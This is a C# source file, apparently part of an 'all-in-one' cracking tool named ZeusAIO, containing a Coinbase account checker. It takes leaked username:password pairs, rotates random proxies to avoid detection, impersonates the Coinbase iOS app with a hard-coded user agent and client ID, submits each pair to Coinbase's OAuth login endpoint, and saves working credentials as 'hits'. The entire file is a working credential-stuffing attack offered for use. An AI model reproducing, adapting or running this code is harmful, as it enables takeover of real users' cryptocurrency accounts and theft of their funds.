using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Coinbase
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Coinbase/7.30.9 (com.vilcsak.bitcoin2; build:11666; iOS 13.6.0) Alamofire/4.9.1";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string str = "client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&password=" + s[1] + "&redirect_uri=2_legged&scope=all&username=" + s[0];
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://api.coinbase.com/oauth/authorize/with-credentials", str, "application/x-www-form-urlencoded; charset=utf-8").ToString();
                            {
                                if (strResponse.Contains("success\":false"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("success\":true"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui== "2")
                                    {
                                        Console.WriteLine("[HIT - COINBASE] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Coinbase_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
